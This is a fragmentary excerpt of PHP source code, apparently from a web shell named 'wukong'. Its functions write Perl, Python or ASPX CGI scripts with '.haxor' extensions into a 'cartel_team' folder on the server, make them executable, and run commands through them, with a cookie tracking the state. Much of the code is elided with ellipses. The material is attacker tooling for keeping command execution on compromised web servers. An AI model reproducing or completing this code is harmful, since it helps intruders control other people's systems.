...
function _wukong_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		...
		if(isset($_COOKIE["cartel_team"])){
			if(!@file_exists("cartel_team/".$_COOKIE["cartel_team"].".haxor")){
				$recreate = true;
		...
		if(!isset($_COOKIE["cartel_team"])||$recreate){
			...
			if($lang == "aspx"){
				...
				wukongWriteTocgiapi($lang.".haxor",$source);
			}
...
function wukongWriteTocgiapi($name, $source){
	...
	@mkdir('cartel_team',0755);
	__write_file("cartel_team/".$name, __get_resource($source));
	@chmod("cartel_team/".$name, 0755);
	return $temp;
}
...
wukongCreateParentFolder();
@chdir($GLOBALS['home_cwd'] . "/" . __wukong_DATA_FOLDER__);
if(!in_array($_POST['wukong1'],array('perl','py'))){
$div = "</div>";
